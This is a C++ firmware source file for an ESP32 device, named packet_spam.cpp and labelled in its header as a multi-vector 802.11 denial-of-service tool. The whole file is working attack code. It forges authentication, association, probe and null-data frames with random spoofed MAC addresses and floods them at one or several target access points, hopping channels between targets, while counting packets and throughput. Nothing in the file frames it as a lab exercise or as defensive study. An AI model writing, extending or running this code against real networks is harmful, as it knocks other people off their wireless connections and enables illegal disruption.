// ─────────────────────────────────────────────────────────────────────────────
//  packet_spam.cpp  —  Multi-vector 802.11 DoS
//
//  Supports single-target and multi-target (same-SSID) modes.
//  Tracks: total packets, total bytes, per-type packet counts, kB/s rate.
// ─────────────────────────────────────────────────────────────────────────────

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include "packet_spam.h"
#include "definitions.h"

volatile bool     packet_spam_running = false;
volatile uint32_t packets_sent        = 0;
volatile uint32_t bytes_sent          = 0;
volatile uint32_t pkts_auth           = 0;
volatile uint32_t pkts_assoc          = 0;
volatile uint32_t pkts_probe          = 0;
volatile uint32_t pkts_null           = 0;
volatile uint32_t kbps                = 0;   // rolling kB/s

// Multi-target support: up to MAX_SPAM_TARGETS BSSIDs attacked simultaneously
static uint8_t target_bssids[MAX_SPAM_TARGETS][6];
static uint8_t target_channels[MAX_SPAM_TARGETS];
static int     target_count = 0;

// Rate tracking
static uint32_t bytes_last_sec   = 0;
static unsigned long rate_ts     = 0;

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void* buffer, int len, bool en_sys_seq);

// ── Random locally-administered unicast MAC ───────────────────────────────────
static void rand_mac(uint8_t* mac) {
    uint32_t r1 = esp_random(), r2 = esp_random();
    mac[0] = 0x02;
    mac[1] = (r1 >>  8) & 0xFF; mac[2] = (r1 >> 16) & 0xFF;
    mac[3] = (r1 >> 24) & 0xFF; mac[4] = (r2      ) & 0xFF;
    mac[5] = (r2 >>  8) & 0xFF;
}

static void write_radiotap(uint8_t* f, int& pos) {
    f[pos++]=0x00; f[pos++]=0x00;
    f[pos++]=0x08; f[pos++]=0x00;
    f[pos++]=0x00; f[pos++]=0x00;
    f[pos++]=0x00; f[pos++]=0x00;
}

static void tx(const uint8_t* f, int len) {
    esp_wifi_80211_tx(WIFI_IF_AP, f, len, false);
    packets_sent++;
    bytes_sent += (uint32_t)len;
}

// ── 1. Auth request ───────────────────────────────────────────────────────────
static void send_auth(const uint8_t* bssid) {
    uint8_t src[6]; rand_mac(src);
    uint8_t f[64]; int pos = 0;
    write_radiotap(f, pos);
    f[pos++]=0xB0; f[pos++]=0x00;
    f[pos++]=0x00; f[pos++]=0x00;
    memcpy(f+pos, bssid, 6); pos+=6;
    memcpy(f+pos, src,   6); pos+=6;
    memcpy(f+pos, bssid, 6); pos+=6;
    f[pos++]=0x00; f[pos++]=0x00;
    f[pos++]=0x00; f[pos++]=0x00; // open system
    f[pos++]=0x01; f[pos++]=0x00; // seq 1
    f[pos++]=0x00; f[pos++]=0x00; // success
    tx(f, pos); pkts_auth++;
}

// ── 2. Association request ────────────────────────────────────────────────────
static void send_assoc(const uint8_t* bssid) {
    uint8_t src[6]; rand_mac(src);
    uint8_t f[96]; int pos = 0;
    write_radiotap(f, pos);
    f[pos++]=0x00; f[pos++]=0x00;
    f[pos++]=0x00; f[pos++]=0x00;
    memcpy(f+pos, bssid, 6); pos+=6;
    memcpy(f+pos, src,   6); pos+=6;
    memcpy(f+pos, bssid, 6); pos+=6;
    f[pos++]=0x00; f[pos++]=0x00;
    f[pos++]=0x31; f[pos++]=0x04; // capability
    f[pos++]=0x0A; f[pos++]=0x00; // listen interval
    f[pos++]=0x00; f[pos++]=0x00; // wildcard SSID
    f[pos++]=0x01; f[pos++]=0x08;
    f[pos++]=0x82; f[pos++]=0x84; f[pos++]=0x8B; f[pos++]=0x96;
    f[pos++]=0x24; f[pos++]=0x30; f[pos++]=0x48; f[pos++]=0x6C;
    tx(f, pos); pkts_assoc++;
}

// ── 3. Probe request ──────────────────────────────────────────────────────────
static void send_probe(const uint8_t* bssid) {
    uint8_t src[6]; rand_mac(src);
    uint8_t f[64]; int pos = 0;
    write_radiotap(f, pos);
    f[pos++]=0x40; f[pos++]=0x00;
    f[pos++]=0x00; f[pos++]=0x00;
    f[pos++]=0xFF; f[pos++]=0xFF; f[pos++]=0xFF;
    f[pos++]=0xFF; f[pos++]=0xFF; f[pos++]=0xFF;
    memcpy(f+pos, src,   6); pos+=6;
    memcpy(f+pos, bssid, 6); pos+=6;
    f[pos++]=0x00; f[pos++]=0x00;
    f[pos++]=0x00; f[pos++]=0x00; // wildcard SSID
    f[pos++]=0x01; f[pos++]=0x08;
    f[pos++]=0x02; f[pos++]=0x04; f[pos++]=0x0B; f[pos++]=0x16;
    f[pos++]=0x0C; f[pos++]=0x12; f[pos++]=0x18; f[pos++]=0x24;
    f[pos++]=0x32; f[pos++]=0x04;
    f[pos++]=0x30; f[pos++]=0x48; f[pos++]=0x60; f[pos++]=0x6C;
    tx(f, pos); pkts_probe++;
}

// ── 4. Null data frame ────────────────────────────────────────────────────────
static void send_null(const uint8_t* bssid) {
    uint8_t f[32]; int pos = 0;
    write_radiotap(f, pos);
    f[pos++]=0x48; f[pos++]=0x02;
    f[pos++]=0x00; f[pos++]=0x00;
    f[pos++]=0xFF; f[pos++]=0xFF; f[pos++]=0xFF;
    f[pos++]=0xFF; f[pos++]=0xFF; f[pos++]=0xFF;
    memcpy(f+pos, bssid, 6); pos+=6;
    memcpy(f+pos, bssid, 6); pos+=6;
    f[pos++]=0x00; f[pos++]=0x00;
    tx(f, pos); pkts_null++;
}

// ── Public API ────────────────────────────────────────────────────────────────

// Single target
void start_packet_spam(const uint8_t* bssid, uint8_t channel) {
    if (packet_spam_running) stop_packet_spam();

    target_count = 1;
    memcpy(target_bssids[0], bssid, 6);
    target_channels[0] = channel;

    packets_sent = bytes_sent = pkts_auth = pkts_assoc = pkts_probe = pkts_null = kbps = 0;
    bytes_last_sec = 0;
    rate_ts = millis();

    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(AP_SSID, AP_PASS, channel, 0);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(false);
    packet_spam_running = true;

    DEBUG_PRINTF("DoS started CH%d %02X:%02X:%02X:%02X:%02X:%02X\n",
        channel, bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);
}

// Multi-target (same SSID) — pass array of BSSIDs + count, all same channel
void start_packet_spam_multi(uint8_t bssids[][6], uint8_t* channels, int count) {
    if (packet_spam_running) stop_packet_spam();

    target_count = min(count, MAX_SPAM_TARGETS);
    for (int i = 0; i < target_count; i++) {
        memcpy(target_bssids[i], bssids[i], 6);
        target_channels[i] = channels[i];
    }

    packets_sent = bytes_sent = pkts_auth = pkts_assoc = pkts_probe = pkts_null = kbps = 0;
    bytes_last_sec = 0;
    rate_ts = millis();

    // Use first target's channel as base (channel hops handled per-burst below)
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(AP_SSID, AP_PASS, channels[0], 0);
    esp_wifi_set_channel(channels[0], WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(false);
    packet_spam_running = true;

    DEBUG_PRINTF("Multi-DoS started: %d targets\n", target_count);
}

void stop_packet_spam() {
    if (!packet_spam_running) return;
    packet_spam_running = false;
    packets_sent = bytes_sent = pkts_auth = pkts_assoc = pkts_probe = pkts_null = kbps = 0;
    target_count = 0;
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(AP_SSID, AP_PASS);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    DEBUG_PRINTLN("DoS stopped.");
}

// 32 frames per burst per target, channel-hops between targets
void packet_spam_loop() {
    if (!packet_spam_running) return;

    for (int t = 0; t < target_count; t++) {
        // Hop to this target's channel
        if (target_count > 1)
            esp_wifi_set_channel(target_channels[t], WIFI_SECOND_CHAN_NONE);

        const uint8_t* bssid = target_bssids[t];
        for (int i = 0; i < 8; i++) {
            send_auth(bssid);
            send_assoc(bssid);
            send_probe(bssid);
            send_null(bssid);
        }
    }

    // Update kB/s every second
    unsigned long now = millis();
    if (now - rate_ts >= 1000) {
        uint32_t delta = bytes_sent - bytes_last_sec;
        kbps = delta / 1024;
        bytes_last_sec = bytes_sent;
        rate_ts = now;
    }
}
